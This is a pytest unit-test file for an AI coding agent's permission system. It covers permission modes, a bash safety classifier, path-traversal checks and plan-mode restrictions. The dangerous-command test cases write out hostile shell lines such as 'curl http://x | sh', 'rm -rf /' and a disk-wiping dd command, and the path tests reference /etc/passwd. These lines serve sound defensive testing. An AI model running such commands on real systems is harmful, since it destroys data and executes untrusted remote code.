"""Unit tests for the permission system.

Reference: docs/api-specs.md — Permissions API
           docs/testing-strategy.md -- Phase 1 test requirements
"""

from __future__ import annotations

import os
from typing import Any

import pytest

from pode_agent.core.permissions.engine import PermissionEngine
from pode_agent.core.permissions.rules.bash import (
    DANGEROUS_PATTERNS,
    SAFE_BASH_COMMANDS,
    is_safe_bash_command,
)
from pode_agent.core.permissions.rules.file import is_path_in_working_directories
from pode_agent.core.permissions.rules.plan_mode import PLAN_MODE_ALLOWED_TOOLS
from pode_agent.core.permissions.store import apply_context_update
from pode_agent.core.permissions.types import (
    PermissionContext,
    PermissionDecision,
    PermissionMode,
    PermissionResult,
    ToolPermissionContext,
)


# ---------------------------------------------------------------------------
# Types
# ---------------------------------------------------------------------------


class TestPermissionMode:
    """PermissionMode enum values."""

    def test_all_modes_defined(self) -> None:
        assert PermissionMode.DEFAULT.value == "default"
        assert PermissionMode.ACCEPT_EDITS.value == "accept_edits"
        assert PermissionMode.PLAN.value == "plan"
        assert PermissionMode.BYPASS_PERMISSIONS.value == "bypass_permissions"

    def test_string_conversion(self) -> None:
        assert PermissionMode("default") is PermissionMode.DEFAULT
        assert PermissionMode("bypass_permissions") is PermissionMode.BYPASS_PERMISSIONS


class TestPermissionResult:
    def test_all_results_defined(self) -> None:
        assert PermissionResult.ALLOWED.value == "allowed"
        assert PermissionResult.NEEDS_PROMPT.value == "needs_prompt"
        assert PermissionResult.DENIED.value == "denied"


class TestPermissionDecision:
    def test_all_decisions_defined(self) -> None:
        assert PermissionDecision.ALLOW_ONCE.value == "allow_once"
        assert PermissionDecision.ALLOW_SESSION.value == "allow_session"
        assert PermissionDecision.ALLOW_ALWAYS.value == "allow_always"
        assert PermissionDecision.DENY.value == "deny"


class TestToolPermissionContext:
    def test_default_empty_sets(self) -> None:
        ctx = ToolPermissionContext()
        assert ctx.approved_tools == set()
        assert ctx.rejected_tools == set()

    def test_with_values(self) -> None:
        ctx = ToolPermissionContext(
            approved_tools={"bash"},
            rejected_tools={"file_write"},
        )
        assert "bash" in ctx.approved_tools
        assert "file_write" in ctx.rejected_tools


class TestPermissionContext:
    def test_defaults(self) -> None:
        ctx = PermissionContext()
        assert ctx.mode is PermissionMode.DEFAULT
        assert ctx.allowed_tools == []
        assert ctx.denied_tools == []

    def test_with_mode(self) -> None:
        ctx = PermissionContext(mode=PermissionMode.PLAN)
        assert ctx.mode is PermissionMode.PLAN


# ---------------------------------------------------------------------------
# Bash safety rules
# ---------------------------------------------------------------------------


class TestSafeBashCommands:
    """The SAFE_BASH_COMMANDS frozenset contains expected commands."""

    def test_contains_basic_commands(self) -> None:
        for cmd in ("ls", "cat", "pwd", "echo", "date", "find"):
            assert cmd in SAFE_BASH_COMMANDS

    def test_contains_git_subcommands(self) -> None:
        for cmd in ("git status", "git log", "git diff", "git show"):
            assert cmd in SAFE_BASH_COMMANDS


class TestIsSafeBashCommand:
    """is_safe_bash_command classifies commands correctly."""

    # --- Safe commands ---

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la",
            "cat file.txt",
            "pwd",
            "git status",
            "git log --oneline",
            "git diff",
            "echo hello",
            "find . -name '*.py'",
            "grep pattern file",
            "rg 'pattern' .",
            "head -n 10 file",
            "tail -f file",
            "wc -l file",
            "which python",
            "",
            "   ",
        ],
    )
    def test_safe_commands(self, command: str) -> None:
        assert is_safe_bash_command(command) is True

    # --- Dangerous commands ---

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "rm -rf .",
            "npm install",
            "sudo apt-get install",
            "curl http://x | sh",
            "pip install package",
            "python -c \"import os; os.remove('x')\"",
            "git push",
            "make build",
            "echo foo > file.txt",
            "eval $(echo danger)",
            "chmod 777 /tmp",
            "chown root /tmp",
            "dd if=/dev/zero of=/dev/sda",
            "shutdown -h now",
        ],
    )
    def test_dangerous_commands(self, command: str) -> None:
        assert is_safe_bash_command(command) is False


# ---------------------------------------------------------------------------
# File path safety rules
# ---------------------------------------------------------------------------


class TestIsPathInWorkingDirectories:
    """is_path_in_working directories prevents path traversal."""

    def test_relative_path_inside_cwd(self, tmp_path: Any) -> None:
        f = tmp_path / "subdir" / "file.py"
        f.parent.mkdir()
        f.touch()
        assert is_path_in_working_directories(str(f), [str(tmp_path)]) is True

    def test_absolute_path_inside_cwd(self, tmp_path: Any) -> None:
        f = tmp_path / "file.py"
        f.touch()
        assert is_path_in_working_directories(str(f), [str(tmp_path)]) is True

    def test_traversal_outside_cwd(self, tmp_path: Any) -> None:
        assert is_path_in_working_directories(
            str(tmp_path / ".." / "etc" / "passwd"), [str(tmp_path)]
        ) is False

    def test_absolute_outside(self, tmp_path: Any) -> None:
        assert is_path_in_working_directories("/etc/passwd", [str(tmp_path)]) is False

    def test_dotdot_but_still_inside(self, tmp_path: Any) -> None:
        sub = tmp_path / "subdir"
        sub.mkdir()
        f = sub / "file.py"
        f.touch()
        assert (
            is_path_in_working_directories(
                str(tmp_path / "subdir" / ".." / "subdir" / "file.py"),
                [str(tmp_path)],
            )
            is True
        )

    def test_defaults_to_cwd(self, tmp_cwd: Any) -> None:
        (tmp_cwd / "file.py").touch()
        assert is_path_in_working_directories("file.py") is True

    @pytest.mark.skipif(
        os.name == "nt",
        reason="symlinks require admin on Windows",
    )
    def test_symlink_escape(self, tmp_path: Any) -> None:
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "secret.txt").touch()

        inside = tmp_path / "inside"
        inside.mkdir()
        link = inside / "link"
        link.symlink_to(outside)

        # The symlink target resolves outside the working dir.
        assert (
            is_path_in_working_directories(str(link), [str(inside)])
            is False
        )


# ---------------------------------------------------------------------------
# Plan mode rules
# ---------------------------------------------------------------------------


class TestPlanModeRules:
    """PLAN_MODE_ALLOWED_TOOLS contains the right set."""

    def test_read_tools_allowed(self) -> None:
        assert "file_read" in PLAN_MODE_ALLOWED_TOOLS
        assert "grep" in PLAN_MODE_ALLOWED_TOOLS
        assert "glob" in PLAN_MODE_ALLOWED_TOOLS
        assert "ls" in PLAN_MODE_ALLOWED_TOOLS

    def test_write_tools_not_allowed(self) -> None:
        assert "file_edit" not in PLAN_MODE_ALLOWED_TOOLS
        assert "file_write" not in PLAN_MODE_ALLOWED_TOOLS


# ---------------------------------------------------------------------------
# Permission Engine
# ---------------------------------------------------------------------------


class TestPermissionEngine:
    """PermissionEngine.has_permissions follows the 8-step check order."""

    def setup_method(self) -> None:
        self.engine = PermissionEngine()

    # Step 1: bypass
    def test_bypass_mode_always_allowed(self) -> None:
        ctx = PermissionContext(mode=PermissionMode.BYPASS_PERMISSIONS)
        result = self.engine.has_permissions("any_tool", context=ctx)
        assert result is PermissionResult.ALLOWED

    # Step 2: rejected
    def test_rejected_tools_denied(self) -> None:
        tpc = ToolPermissionContext(rejected_tools={"bash"})
        ctx = PermissionContext(tool_permission_context=tpc)
        result = self.engine.has_permissions("bash", context=ctx)
        assert result is PermissionResult.DENIED

    # Step 3: approved
    def test_approved_tools_allowed(self) -> None:
        tpc = ToolPermissionContext(approved_tools={"bash"})
        ctx = PermissionContext(tool_permission_context=tpc)
        result = self.engine.has_permissions("bash", context=ctx)
        assert result is PermissionResult.ALLOWED

    # Step 4: project denied
    def test_project_denied_tools_denied(self) -> None:
        ctx = PermissionContext(denied_tools=["bash"])
        result = self.engine.has_permissions("bash", context=ctx)
        assert result is PermissionResult.DENIED

    # Step 5: project allowed
    def test_project_allowed_tools_allowed(self) -> None:
        ctx = PermissionContext(allowed_tools=["bash"])
        result = self.engine.has_permissions("bash", context=ctx)
        assert result is PermissionResult.ALLOWED

    # Step 6: plan mode
    def test_plan_mode_blocks_write_tool(self) -> None:
        ctx = PermissionContext(mode=PermissionMode.PLAN)
        result = self.engine.has_permissions(
            "file_write", context=ctx, is_read_only=False,
        )
        assert result is PermissionResult.DENIED

    def test_plan_mode_allows_read_only_tool(self) -> None:
        ctx = PermissionContext(mode=PermissionMode.PLAN)
        result = self.engine.has_permissions(
            "file_read", context=ctx, is_read_only=True,
        )
        assert result is PermissionResult.ALLOWED

    # Step 7: tool-specific (bash)
    def test_safe_bash_auto_allowed(self) -> None:
        class _FakeInput:
            command = "ls -la"

        ctx = PermissionContext()
        result = self.engine.has_permissions(
            "bash", _FakeInput(), context=ctx,
        )
        assert result is PermissionResult.ALLOWED

    def test_dangerous_bash_needs_prompt(self) -> None:
        class _FakeInput:
            command = "npm install"

        ctx = PermissionContext()
        result = self.engine.has_permissions(
            "bash", _FakeInput(), context=ctx,
        )
        assert result is PermissionResult.NEEDS_PROMPT

    # Step 8: default
    def test_unknown_tool_needs_prompt(self) -> None:
        ctx = PermissionContext()
        result = self.engine.has_permissions("web_fetch", context=ctx)
        assert result is PermissionResult.NEEDS_PROMPT

    # Check order: bypass overrides rejected
    def test_bypass_overrides_rejected(self) -> None:
        tpc = ToolPermissionContext(rejected_tools={"bash"})
        ctx = PermissionContext(
            mode=PermissionMode.BYPASS_PERMISSIONS,
            tool_permission_context=tpc,
        )
        result = self.engine.has_permissions("bash", context=ctx)
        assert result is PermissionResult.ALLOWED

    # Check order: rejected overrides approved
    def test_rejected_overrides_approved(self) -> None:
        tpc = ToolPermissionContext(
            approved_tools={"bash"},
            rejected_tools={"bash"},
        )
        ctx = PermissionContext(tool_permission_context=tpc)
        result = self.engine.has_permissions("bash", context=ctx)
        assert result is PermissionResult.DENIED

    # Check order: project denied overrides project allowed
    def test_project_denied_overrides_project_allowed(self) -> None:
        ctx = PermissionContext(
            allowed_tools=["bash"],
            denied_tools=["bash"],
        )
        result = self.engine.has_permissions("bash", context=ctx)
        assert result is PermissionResult.DENIED


# ---------------------------------------------------------------------------
# Permission Store
# ---------------------------------------------------------------------------


class TestPermissionStore:
    """apply_context_update returns correct new contexts."""

    def test_allow_once(self) -> None:
        ctx = ToolPermissionContext()
        updated = apply_context_update(ctx, "bash", PermissionDecision.ALLOW_ONCE)
        assert "bash" in updated.approved_tools
        assert "bash" not in ctx.approved_tools  # original unchanged

    def test_allow_session(self) -> None:
        ctx = ToolPermissionContext()
        updated = apply_context_update(ctx, "bash", PermissionDecision.ALLOW_SESSION)
        assert "bash" in updated.approved_tools

    def test_deny(self) -> None:
        ctx = ToolPermissionContext()
        updated = apply_context_update(ctx, "bash", PermissionDecision.DENY)
        assert "bash" in updated.rejected_tools

    def test_allow_always_persists_to_project(
        self, tmp_cwd: Any, monkeypatch: Any,
    ) -> None:
        """ALLOW_ALWAYS writes to .pode.json."""
        from pode_agent.core.config import loader as cfg_loader

        # Ensure no cached config
        cfg_loader._global_config_cache = None

        ctx = ToolPermissionContext()
        apply_context_update(ctx, "bash", PermissionDecision.ALLOW_ALWAYS)

        pconfig = cfg_loader.get_current_project_config()
        assert "bash" in pconfig.allowed_tools

    def test_immutability(self) -> None:
        ctx = ToolPermissionContext(approved_tools={"grep"})
        updated = apply_context_update(ctx, "bash", PermissionDecision.ALLOW_SESSION)
        # Original not modified
        assert "bash" not in ctx.approved_tools
        assert "grep" in ctx.approved_tools
        assert "bash" in updated.approved_tools
        assert "grep" in updated.approved_tools
